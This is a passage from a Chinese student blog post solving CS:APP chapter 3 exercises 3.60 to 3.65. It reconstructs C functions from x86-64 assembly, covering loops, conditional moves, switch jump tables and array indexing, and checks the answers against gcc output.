<li>B.result和mask的初始值是什么？</li>
<li>C.mask的测试条件是什么？</li>
<li>D.mask是如何被修改的？</li>
<li>E.result是如何被修改的</li>
<li>F.填写这段C代码中所有空缺部分</li>
</ul>
</blockquote>
<p>既然题目给了引导，那就逐步解答：</p>
<ul>
<li>A. 按照约定，x在rdi，n在esi和ecx；L2的循环开始值是看rdx是否为0，所以mask在rdx；L3里的或运算太明显了，result在rax</li>
<li>B. loop标签里有两个立即数赋值，result = 0 , mask = 1</li>
<li>C. mask要为0，按位与之后才能把0标志位设置为1，而jne判断标准就是0标志位，为1说明相等，不跳转，返回</li>
<li>D. 看一眼循环中rdx的变化，把x放到r8，在把mask和r8按位与但是这里结果在r8，没有改变mask。改变在第10行，把rdx算术左移了cl的值位，为什么是cl？</li>
<li>E. result = result | (mask &amp; x)</li>
<li>F. 开始猜<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">loop</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> mask<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>mask <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span> mask <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">;</span> mask <span class="token operator">=</span> mask <span class="token operator">&lt;&lt;</span> n <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        result <span class="token operator">|=</span> <span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">loop</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> <span class="token number">3.60</span>.cpp <span class="token parameter variable">-o</span> <span class="token number">3.60</span>.s <span class="token parameter variable">-O1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">.LFB0:
.cfi_startproc
endbr64
movl%esi, %ecx
movl$1, %eax
movl$0, %edx
.L2:
movq%rdi, %r8
andq%rax, %r8
orq%r8, %rdx
salq%cl, %rax
testq%rax, %rax
jne.L2
movq%rdx, %rax
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
呃，所有rax和rdx都反了，然后末尾多了一行movq %rdx, %rax，没差，一遍过</li>
</ul>
<p>此题告诉我们jne的上一行不一定是cmp，也可以是test</p>
<h2 id="题目-3-61"><a href="#题目-3-61" class="headerlink" title="题目 **3.61"></a>题目 **3.61</h2><blockquote>
<p>在3.6.6节，我们查看了下面的代码，作为使用条件数据传送的一种选择：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">cread</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>xp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>xp <span class="token operator">?</span> <span class="token operator">*</span>xp <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>我们给出了使用条件传送指令的一个尝试实现，但认为它是不合法的，因为它试图从一个空地址读数据。<br>写一个C函数cread_alt，它与cread有一样的的行为，除了它可以被编译成使用条件数据传送。当编译时，产生的代码应该使用条件传送指令而不是某种跳转指令。</p>
</blockquote>
<p>时间有点久，复习一下条件数据传送和控制条件转移</p>
<ul>
<li>控制条件转移就是各种跳转，跑起来还要分支预测，预测错了还有惩罚</li>
<li>数据传送就是预测什么我全都要，然后判断完了选一个，只在受限情况下更优</li>
</ul>
<p>那回到本题，条件传送的思想是走完所有分支，但是前提是分支里可以无副作用且不会出错，本题里就不满足这一前提，所以编译器的行为不是数据传送</p>
<p>先试试引入中间变量：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">cread_alt</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>xp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xp<span class="token punctuation">)</span> t <span class="token operator">=</span> <span class="token operator">*</span>xp<span class="token punctuation">;</span>
  <span class="token keyword">return</span> t<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token punctuation">;</span>
  <span class="token function">cread_alt</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>失败，又试了几种方案，比如引入中间指针，但是转到汇编都是跳转，去网上找了几版”答案”，给的都是<br><code>return (!xp ? 0 : *xp);</code></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">long</span> <span class="token function">cread</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>xp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>xp <span class="token operator">?</span> <span class="token operator">*</span>xp <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">long</span> <span class="token function">cread_alt</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>xp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">!</span>xp <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token operator">*</span>xp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">cread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">cread_alt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">cread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">cread_alt</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而汇编完还是条件跳转，就很无语，编译器任性是吧，先搁置吧，贴一下我的环境：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc version <span class="token number">13.3</span>.0 <span class="token punctuation">(</span>Ubuntu <span class="token number">13.3</span>.0-6ubuntu2~24.04<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h2 id="题目-3-62"><a href="#题目-3-62" class="headerlink" title="题目 **3.62"></a>题目 **3.62</h2><blockquote>
<p>下面的代码给出了一个switch语句中根据枚举类型值进行分支选择的例子。回忆一下，C语言中枚<br>举类型只是一种引入一组与整数值相对应的名字的方法。默认情况下，值是从0向上依次赋给名<br>字的。在我们的代码中，省略了与各种情况标号相对应的动作。<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>MODE_A<span class="token punctuation">,</span> MODE_B<span class="token punctuation">,</span> MODE_C<span class="token punctuation">,</span> MODE_D<span class="token punctuation">,</span> MODE_E<span class="token punctuation">&#125;</span> <span class="token class-name">mode_t</span>

<span class="token keyword">long</span> <span class="token function">switch3</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2<span class="token punctuation">,</span> <span class="token class-name">mode_t</span> action<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">swtich</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> MODE_A<span class="token operator">:</span>

      <span class="token keyword">case</span> MODE_B<span class="token operator">:</span>

      <span class="token keyword">case</span> MODE_C<span class="token operator">:</span>

      <span class="token keyword">case</span> MODE_D<span class="token operator">:</span>

      <span class="token keyword">case</span> MODE_E<span class="token operator">:</span>
      
      <span class="token keyword">default</span><span class="token operator">:</span>

  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>产生的实现各个动作的汇编代码部分如图 3-52 所示。注释指明了参数位置，寄存器值，<br>各个跳转目的的情况标号。<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">&gt;.L8            ;MODE_E
  movl $27, %eax
  ret
&gt;.L3            ;MODE_A
  movq  (%rsi), %rax
  movq  (%rdi), rdx
  movq  %rdi, (%rsi)
  ret
&gt;.L5:           ;MODE_B
  movq  (%rdi), %rax
  addq  (%rsi), %rax
  movq  %rax, (%rdi)
  ret
&gt;.L6:           ;MODE_C
  movq  $59, (%rdi)
  movq  (%rsi), %rax
  ret
&gt;.L7            ;MODE_D
  movq  (%rsi), %rax
  movq  %rax , (%rdi)
  movl  $27 , %eax
  ret
&gt;.L9:           ;default
  movl $12, %eax
  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>填写C代码中缺失的部分。代码包括落入其他情况的情况，试着重建这个情况。</p>
</blockquote>
<p>看着没有什么难度</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>MODE_A<span class="token punctuation">,</span> MODE_B<span class="token punctuation">,</span> MODE_C<span class="token punctuation">,</span> MODE_D<span class="token punctuation">,</span> MODE_E<span class="token punctuation">&#125;</span> <span class="token class-name">mode_t</span><span class="token punctuation">;</span>

<span class="token keyword">long</span> <span class="token function">switch3</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2<span class="token punctuation">,</span> <span class="token class-name">mode_t</span> action<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token keyword">switch</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> MODE_A<span class="token operator">:</span><span class="token punctuation">&#123;</span>
          <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
          <span class="token keyword">long</span> tmp2 <span class="token operator">=</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
          <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
          <span class="token keyword">return</span> tmp<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> MODE_B<span class="token operator">:</span><span class="token punctuation">&#123;</span>
          <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
          tmp <span class="token operator">+=</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
          <span class="token operator">*</span>p1 <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
          <span class="token keyword">return</span> tmp<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> MODE_C<span class="token operator">:</span><span class="token punctuation">&#123;</span>
          <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">case</span> MODE_D<span class="token operator">:</span><span class="token punctuation">&#123;</span>
          <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
          <span class="token operator">*</span>p1 <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token number">27</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">case</span> MODE_E<span class="token operator">:</span>
          <span class="token keyword">return</span> <span class="token number">27</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
          <span class="token keyword">return</span> <span class="token number">12</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> a <span class="token operator">=</span> <span class="token number">100l</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> b <span class="token operator">=</span> <span class="token number">200l</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>
    <span class="token keyword">long</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token operator">&amp;</span>b<span class="token punctuation">;</span>
    <span class="token function">switch3</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> MODE_A<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-S</span> <span class="token number">3.62</span>.cpp <span class="token parameter variable">-o</span> <span class="token number">3.62</span>.s <span class="token parameter variable">-O1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">
.L3:
movl$27, %eax
ret
.L8:
movq(%rsi), %rax
movq(%rdi), %rdx
movq%rdx, (%rsi)
ret
.L7:
movq(%rdi), %rax
addq(%rsi), %rax
movq%rax, (%rdi)
ret
.L6:
movq$59, (%rdi)
movq(%rsi), %rax
ret
.L5:
movq(%rsi), %rax
movq%rax, (%rdi)
movl$27, %eax
ret
.L9:
movl$12, %eax
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>呃，确实没有什么难度。唯一有意思的地方在case MODE_B，最开始我写的是<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> MODE_B<span class="token operator">:</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">long</span> tmp <span class="token operator">=</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
     tmp <span class="token operator">+=</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
     <span class="token operator">*</span>p1 <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
     <span class="token keyword">return</span> tmp<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>看似和汇编对应的更严谨，先把第一个参数拿出来，再加上第二个参数，然而结果却是rdi和rsi位置颠倒，需要反过来才能严格对应上（虽然并不影响结果）</p>
<h2 id="题目-3-63"><a href="#题目-3-63" class="headerlink" title="题目 **3.63"></a>题目 **3.63</h2><blockquote>
<p>这个程序给你一个机会，从反汇编机器代码逆向工程一个switch 语句。在下面这个过程中，去掉了<br>switch 语句的主体：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">switch_prob</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> result <span class="token operator">=</span> x<span class="token punctuation">;</span>
  <span class="token keyword">switch</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token comment">/*Fill in code here*/</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>图3-53给出了这个过程的反汇编机器代码。<br>  跳转表驻留在内存的不同区域中。可以从第5行的间接跳转看出来，跳转表的起始地址为0x4006f8 。用调试器 GDB, 我们可以用命令 x/6gx 0x4006f8 来检查组成跳转表的6个8字节字的内存。 GDB 打印出下面的内容：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span>x/6gx 0x4006f8
0x4006f8:      0x00000000004005a1      0x00000000004005c3
0x400708:      0x00000000004005a1      0x00000000004005aa
0x400718:      0x00000000004005b2      0x00000000004005bf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>用C代码填写switch语句的主体，使它的行为与机器代码一致<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">0000000000400590 &lt;switch_prob&gt;:
  400590:  48 83 ee 3c             sub    $0x3c,%rsi
  400594:  48 83 fe 05             cmp    $0x5,%rsi
  400598:  77 29                   ja     4005c3 &lt;switch_prob+0x33&gt;
  40059a:  ff 24 f5 f8 06 40 00    jmpq   *0x4006f8(,%rsi,8)
  4005a1:  48 8d 04 fd 00 00 00    lea    0x0(,%rdi,8),%rax
  4005a8:  00
  4005a9:  c3                      retq
  4005aa:  48 89 f8                mov    %rdi,%rax
  4005ad:  48 c1 f8 03             sar    $0x3,%rax
  4005b1:  c3                      retq
  4005b2:  48 89 f8                mov    %rdi,%rax            
  4005b5:  48 c1 e0 04             shl    $0x4,%rax
  4005b9:  48 29 f8                sub    %rdi,%rax
  4005bc:  48 89 c7                mov    %rax,%rdi
  4005bf:  48 0f af ff             imul   %rdi,%rdi
  4005c3:  48 8d 47 4b             lea    0x4b(%rdi),%rax
  4005c7:  c3                      retq <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
</blockquote>
<p><del>又是讨厌AT&amp;T的一天，这样下去看intel快觉得别扭了</del></p>
<p>在400594进行了比较，后面的ja是default，jmpq就是跳转到跳转表，典型的switch语句格式。<br>很多条件分支没有break……真是</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">switch_prob</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> result <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">60</span><span class="token operator">:</span>
        <span class="token keyword">case</span> <span class="token number">62</span><span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">63</span><span class="token operator">:</span>
            result <span class="token operator">=</span> x <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">64</span><span class="token operator">:</span>
            result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token operator">-</span> x<span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">65</span><span class="token operator">:</span>
            result <span class="token operator">*=</span> result<span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">61</span><span class="token operator">:</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
          result <span class="token operator">+=</span> <span class="token number">75</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">switch_prob</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">    subq$60, %rsi
cmpq$5, %rsi
ja.L2
leaq.L4(%rip), %rdx
movslq(%rdx,%rsi,4), %rax
addq%rdx, %rax
notrack jmp*%rax
.L4:
.long.L7-.L4
.long.L2-.L4
.long.L7-.L4
.long.L6-.L4
.long.L5-.L4
.long.L3-.L4
.text
.L7:
leaq0(,%rdi,8), %rax
ret
.L6:
movq%rdi, %rax
sarq$3, %rax
ret
.L5:
movq%rdi, %rax
salq$4, %rax
subq%rdi, %rax
movq%rax, %rdi
.L3:
imulq%rdi, %rdi
.L2:
leaq75(%rdi), %rax
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>嗯……欧亨利的条件数据传送。</p>
<h2 id="题目-3-64"><a href="#题目-3-64" class="headerlink" title="题目 ***3.64"></a>题目 ***3.64</h2><blockquote>
<p>考虑下面的源代码，这里<em>R</em>、<em>S</em>和<em>T</em>都是用#define声明的常数：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> A<span class="token punctuation">[</span>R<span class="token punctuation">]</span><span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token punctuation">[</span>T<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">long</span> <span class="token function">store_ele</span><span class="token punctuation">(</span><span class="token keyword">long</span> i<span class="token punctuation">,</span> <span class="token keyword">long</span> j<span class="token punctuation">,</span> <span class="token keyword">long</span> k<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token operator">*</span>dest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token operator">*</span>dest <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在编译这个程序中，GCC产生下面的汇编代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">1store_ele:
2  leaq    (%rsi,%rsi,2), %rax ;rax &#x3D; 3j
3  leaq    (%rsi,%rax,4), %rax ;rax &#x3D; 13j
4  movq    %rdi, %rsi          ;rsi &#x3D; i
5  salq    $6, %rsi            ;rsi &#x3D; 2^6 i
6  addq    %rsi, %rdi          ;rdi &#x3D; 65i
7  addq    %rax, %rdi          ;rdi &#x3D; 65i + 13j
8  addq    %rdi, %rdx          ;rdx &#x3D; 65i + 13j + k
9  movq    A(,%rdx,8), %rax    ;rax &#x3D; A + 8*rdx
10 movq   %rax, (%rcx)         ;*dest &#x3D; rax
11 movl   $3640, %eax
12 ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<ul>
<li>A.将等式（3.1）从二维扩展到三维，根据数组元素A[i][j][k]的位置的公式</li>
<li>B.运用你的逆向工程技术，根据汇编代码，确定<em>R</em>、<em>S</em>和<em>T</em>的值</li>
</ul>
</blockquote>
<p>对于一个数组 <em>T</em> $D[R][C] $;中$D[i][j]$的内存地址，有等式3.1：</p>
<blockquote>
<p> &amp;$ D[i][j] = x_0 + L(C \cdot i + j)$</p>
</blockquote>
<p>其中<em>L</em>是数据类型<em>T</em>以字节为单位的大小</p>
<p>看起来不难，</p>
<ul>
<li><p>A：</p>
<blockquote>
<p>&amp;$ A[i][j][k] = x_0 + L(S \cdot T \cdot i + T \cdot j + k)$</p>
</blockquote>
</li>
<li><p>B：<br>三维数组A的大小明着告诉了，是3640字节，一个long算8字节的话（第9行可确定），RST之积就是455。接下来就又是数偏移了，解答过程写在注释里了</p>
</li>
</ul>
<p>根据得出来的$rdx = 65i + 13j + k$就可以确定另一个参数是$\frac{455}{65} = 7$，所以 R = 7 S = 5 T = 13 </p>
<p>很清晰，应该不必验证了</p>
<h2 id="题目-3-65"><a href="#题目-3-65" class="headerlink" title="题目 *3.65"></a>题目 *3.65</h2><blockquote>
<p>下面的代码转置一个 $M \times M$矩阵的元素，这里$M$是一个用#define定义的常数：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">transpose</span><span class="token punctuation">(</span><span class="token keyword">long</span> A<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> M<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
